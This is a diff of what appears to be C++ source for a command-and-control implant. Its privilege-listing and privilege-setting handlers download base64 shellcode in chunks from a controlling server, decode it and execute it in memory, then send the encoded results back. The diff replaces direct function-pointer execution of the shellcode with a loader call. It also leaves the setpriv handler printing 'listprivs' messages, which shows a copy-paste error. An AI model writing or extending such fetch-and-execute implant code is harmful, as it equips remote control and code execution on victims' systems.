@@ -809,6 +809,7 @@ void handleListPrivs(const std::string &agent_id, const std::string &taskID, con
 
 		std::string downloadChunkResponse = sendRequest(wrapDownloadChunk.dump());
 		PRINTF("[DEBUG] DownloadChunk response: %s\n", downloadChunkResponse.c_str());
+
 		json chunkJ = json::parse(downloadChunkResponse);
 		std::string newchunk = chunkJ.at("chunk");
 		listprivs.append(newchunk);
@@ -826,6 +827,7 @@ void handleListPrivs(const std::string &agent_id, const std::string &taskID, con
 	size_t shellSize = listprivs.size();
 
 	std::string result;
+	listprivs = base64_decode(listprivs);
 	int ret = load_execute_listprivs(listprivs, result);
 	if (ret == 0 && !result.empty()) {
 		// Base64 encode the result to send to the CLI
@@ -853,32 +855,26 @@ void handleSetPriv(const std::string &agent_id, const std::string &taskID, const
 	std::string startcheck = sendRequest(DownloadStart.dump());
 	json startData = json::parse(startcheck);
 
+
 	std::string chunk = startData.at("chunk");
 	PRINTF("[DEBUG] chunk (base64): %s\n", chunk.c_str());
 
 	// Decode the shellcode
 	std::string rawShellcode = base64_decode(chunk);
 	size_t shellSize = rawShellcode.size();
-	BYTE* shellcodeBuf = new BYTE[shellSize];
-	memcpy(shellcodeBuf, rawShellcode.data(), shellSize);
-
-	// Execute shellcode in memory
-	void(*func)() = (void(*)())shellcodeBuf;
-	func();
-
-	// Executes a success given no error
-	bool success = true; // Determine success based on shellcode execution
-
-	delete[] shellcodeBuf;
-
-	if (!success) {
-		sendTaskResult(agent_id, taskID, 5, "");
-		PRINTF("[-] Unable to complete task: setpriv\n[+] Sending back error code (5)...\n");
+	std::string result;
+	int ret = load_execute_listprivs(rawShellcode, result);
+	if (ret == 0 && !result.empty()) {
+		// Base64 encode the result to send to the CLI
+		std::string encodedResult = base64_encode(result);
+		sendTaskResult(agent_id, taskID, 4, encodedResult);
+		PRINTF("[+] Completed task: listprivs\n[+] Result:\n%s\n", result.c_str());
 	}
 	else {
-		sendTaskResult(agent_id, taskID, 4, "");
-		PRINTF("[+] Completed task: setpriv\n[+] Sending back success code (4) with no results...\n");
+		sendTaskResult(agent_id, taskID, 5, "");
+		PRINTF("[-] listprivs shellcode executed but returned no valid output.\n");
 	}
+	
 }
 
 void handleSS(const std::string &agent_id, const std::string &taskID, const std::string &fileID)
